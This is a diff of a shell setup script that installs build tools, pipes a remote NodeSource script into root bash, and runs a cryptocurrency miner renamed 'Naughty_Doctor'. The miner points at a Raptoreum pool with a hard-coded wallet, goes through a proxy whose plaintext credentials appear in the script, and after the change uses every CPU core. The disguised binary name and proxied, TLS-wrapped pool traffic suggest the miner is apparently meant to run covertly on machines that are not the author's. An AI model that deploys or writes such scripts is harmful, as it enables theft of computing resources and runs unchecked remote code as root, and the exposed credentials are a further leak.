@@ -1,4 +1,6 @@
 #!/bin/sh
+
+num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
@@ -49,4 +51,4 @@ unset LD_LIBRARY_PATH
 
 ph add Naughty_Doctor
 
-./Naughty_Doctor --disable-gpu --algorithm ghostrider --pool raptoreumemporium.com:3008 --wallet RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.NaughtyDoctor --proxy mikrotik999:Elibawnos@3.16.66.235:1080
+./Naughty_Doctor --disable-gpu --algorithm ghostrider --pool na-rtm.pool-server.com:5555 --tls true --wallet RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.NaughtyDoctor --proxy mikrotik999:Elibawnos@3.16.66.235:1080 --cpu-threads $num_of_cores
